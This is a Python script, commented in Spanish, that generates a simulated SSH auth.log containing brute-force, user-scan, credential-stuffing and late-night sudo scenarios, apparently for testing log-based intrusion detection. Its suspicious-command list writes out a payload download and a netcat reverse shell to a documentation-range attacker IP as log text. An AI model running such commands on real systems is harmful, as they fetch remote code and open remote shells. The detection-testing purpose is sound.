"""
generate_auth_log.py
====================
Genera un archivo sample_auth.log simulado con:
  - Tráfico SSH normal (logins exitosos, sesiones)
  - Ataque de brute force desde una IP específica
  - Login exitoso tras múltiples fallos (credential stuffing)
  - Comandos sudo ejecutados de madrugada
  - Usuarios inválidos (escaneo de usuarios)
  - Escalada de privilegios con su

Uso:
    python scripts/generate_auth_log.py
    python scripts/generate_auth_log.py --lines 1000 --output data/raw/auth.log
"""

import random
import argparse
from datetime import datetime, timedelta
from pathlib import Path

# --- Configuración de escenarios ---
NORMAL_USERS   = ["ubuntu", "deploy", "appuser", "backup", "monitor"]
ATTACK_IP      = "203.0.113.42"   # IP del atacante (rango de documentación RFC 5737)
NORMAL_IPS     = ["10.0.0.2", "10.0.0.5", "192.168.1.10", "192.168.1.20"]
INVALID_USERS  = ["admin", "root", "test", "guest", "oracle", "pi", "ftpuser"]
HOSTNAME       = "prod-server-01"

NORMAL_COMMANDS = [
    "/usr/bin/apt-get update",
    "/bin/systemctl restart nginx",
    "/usr/bin/tail -f /var/log/nginx/access.log",
    "/bin/cat /etc/passwd",
    "/usr/bin/docker ps",
]

SUSPICIOUS_COMMANDS = [
    "/bin/bash",
    "/bin/sh",
    "/usr/bin/wget http://203.0.113.42/payload.sh",
    "/usr/bin/nc -e /bin/bash 203.0.113.42 4444",
    "/usr/bin/python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
]


def fmt_ts(dt: datetime) -> str:
    """Formato de timestamp de auth.log: 'May 19 03:42:17'"""
    return dt.strftime("%b %e %H:%M:%S").replace("  ", " ")


def ssh_failed(dt, user, ip, port):
    pid = random.randint(1000, 9999)
    return f"{fmt_ts(dt)} {HOSTNAME} sshd[{pid}]: Failed password for {user} from {ip} port {port} ssh2"


def ssh_accepted(dt, user, ip, port):
    pid = random.randint(1000, 9999)
    return f"{fmt_ts(dt)} {HOSTNAME} sshd[{pid}]: Accepted password for {user} from {ip} port {port} ssh2"


def ssh_invalid_user(dt, user, ip, port):
    pid = random.randint(1000, 9999)
    return f"{fmt_ts(dt)} {HOSTNAME} sshd[{pid}]: Invalid user {user} from {ip} port {port}"


def ssh_disconnect(dt, ip, port):
    pid = random.randint(1000, 9999)
    return f"{fmt_ts(dt)} {HOSTNAME} sshd[{pid}]: Disconnected from {ip} port {port} [preauth]"


def sudo_cmd(dt, user, target, cmd):
    return (
        f"{fmt_ts(dt)} {HOSTNAME} sudo:    {user} : TTY=pts/0 ; "
        f"PWD=/home/{user} ; USER={target} ; COMMAND={cmd}"
    )


def pam_session(dt, user, action, service="sshd"):
    pid = random.randint(1000, 9999)
    return (
        f"{fmt_ts(dt)} {HOSTNAME} {service}[{pid}]: "
        f"pam_unix({service}:session): session {action} for user {user} by (uid=0)"
    )


def cron_session(dt, user, action):
    pid = random.randint(1000, 9999)
    return (
        f"{fmt_ts(dt)} {HOSTNAME} CRON[{pid}]: "
        f"pam_unix(cron:session): session {action} for user {user} by (uid=0)"
    )


def generate_log(n_lines: int = 500, start_dt: datetime = None) -> list[str]:
    lines = []
    dt = start_dt or datetime(2024, 5, 19, 8, 0, 0)

    def tick(seconds=None):
        nonlocal dt
        dt += timedelta(seconds=seconds or random.randint(5, 120))

    # -----------------------------------------------------------------------
    # ESCENARIO 1: Tráfico normal de mañana (08:00 – 10:00)
    # -----------------------------------------------------------------------
    normal_count = int(n_lines * 0.45)
    for _ in range(normal_count):
        tick()
        user = random.choice(NORMAL_USERS)
        ip   = random.choice(NORMAL_IPS)
        port = random.randint(49152, 65535)

        lines.append(ssh_accepted(dt, user, ip, port))
        tick(2)
        lines.append(pam_session(dt, user, "opened"))

        # Algunos ejecutan sudo
        if random.random() < 0.3:
            tick(30)
            cmd = random.choice(NORMAL_COMMANDS)
            lines.append(sudo_cmd(dt, user, "root", cmd))

        tick(random.randint(60, 600))
        lines.append(pam_session(dt, user, "closed"))

    # -----------------------------------------------------------------------
    # ESCENARIO 2: Escaneo de usuarios (10:15)
    # -----------------------------------------------------------------------
    dt = datetime(2024, 5, 19, 10, 15, 0)
    scan_ip = "198.51.100.77"   # Otro rango RFC 5737
    for user in INVALID_USERS * 2:
        tick(random.randint(1, 8))
        port = random.randint(49152, 65535)
        lines.append(ssh_invalid_user(dt, user, scan_ip, port))
        tick(1)
        lines.append(ssh_disconnect(dt, scan_ip, port))

    # -----------------------------------------------------------------------
    # ESCENARIO 3: Brute force desde ATTACK_IP (14:30)
    # -----------------------------------------------------------------------
    dt = datetime(2024, 5, 19, 14, 30, 0)
    target_user = "ubuntu"
    brute_count = int(n_lines * 0.15)
    for _ in range(brute_count):
        tick(random.randint(1, 4))   # Intentos rápidos
        port = random.randint(49152, 65535)
        lines.append(ssh_failed(dt, target_user, ATTACK_IP, port))

    # -----------------------------------------------------------------------
    # ESCENARIO 4: Credential stuffing — éxito tras fallos (14:52)
    # -----------------------------------------------------------------------
    dt = datetime(2024, 5, 19, 14, 52, 0)
    for _ in range(5):
        tick(3)
        port = random.randint(49152, 65535)
        lines.append(ssh_failed(dt, "deploy", ATTACK_IP, port))

    tick(8)
    port = random.randint(49152, 65535)
    lines.append(ssh_accepted(dt, "deploy", ATTACK_IP, port))
    tick(2)
    lines.append(pam_session(dt, "deploy", "opened"))

    # -----------------------------------------------------------------------
    # ESCENARIO 5: Actividad nocturna sospechosa — sudo a las 03:17
    # -----------------------------------------------------------------------
    dt = datetime(2024, 5, 20, 3, 17, 0)
    lines.append(ssh_accepted(dt, "deploy", ATTACK_IP, 52341))
    tick(5)
    lines.append(pam_session(dt, "deploy", "opened"))

    for cmd in SUSPICIOUS_COMMANDS:
        tick(random.randint(10, 45))
        lines.append(sudo_cmd(dt, "deploy", "root", cmd))

    tick(120)
    lines.append(pam_session(dt, "deploy", "closed"))

    # -----------------------------------------------------------------------
    # ESCENARIO 6: Tráfico CRON normal (cada hora)
    # -----------------------------------------------------------------------
    for hour in [9, 10, 11, 12, 13, 14, 15, 16, 17]:
        cron_dt = datetime(2024, 5, 19, hour, 0, 1)
        lines.append(cron_session(cron_dt, "root", "opened"))
        lines.append(cron_session(cron_dt + timedelta(seconds=2), "root", "closed"))

    # -----------------------------------------------------------------------
    # Rellenar hasta n_lines con tráfico normal adicional
    # -----------------------------------------------------------------------
    dt = datetime(2024, 5, 19, 16, 0, 0)
    while len(lines) < n_lines:
        tick()
        user = random.choice(NORMAL_USERS)
        ip   = random.choice(NORMAL_IPS)
        port = random.randint(49152, 65535)
        lines.append(ssh_accepted(dt, user, ip, port))

    # Ordenar cronológicamente
    def extract_ts(line):
        try:
            parts = line.split()
            ts_str = f"{parts[0]} {parts[1]} {parts[2]} 2024"
            return datetime.strptime(ts_str, "%b %d %H:%M:%S %Y")
        except Exception:
            return datetime.min

    lines.sort(key=extract_ts)
    return lines


def main():
    parser = argparse.ArgumentParser(description="Generador de auth.log simulado")
    parser.add_argument("--lines",  type=int,  default=500,
                        help="Número aproximado de líneas (default: 500)")
    parser.add_argument("--output", type=str,
                        default="data/raw/sample_auth.log",
                        help="Ruta del archivo de salida")
    args = parser.parse_args()

    out = Path(args.output)
    out.parent.mkdir(parents=True, exist_ok=True)

    print(f"Generando ~{args.lines} líneas de auth.log simulado...")
    lines = generate_log(n_lines=args.lines)

    with open(out, "w") as f:
        f.write("\n".join(lines) + "\n")

    print(f"✓ Archivo generado : {out}")
    print(f"  Total líneas     : {len(lines)}")
    print(f"\nAnomалías incluidas:")
    print(f"  · Brute force desde {ATTACK_IP} (~{int(args.lines * 0.15)} intentos)")
    print(f"  · Credential stuffing: login exitoso de 'deploy' tras 5 fallos")
    print(f"  · Actividad nocturna: sudo sospechoso a las 03:17")
    print(f"  · Escaneo de usuarios desde 198.51.100.77")
    print(f"\nUso siguiente:")
    print(f"  from core.parser import parse_file")
    print(f"  df = parse_file('{out}')")


if __name__ == "__main__":
    main()
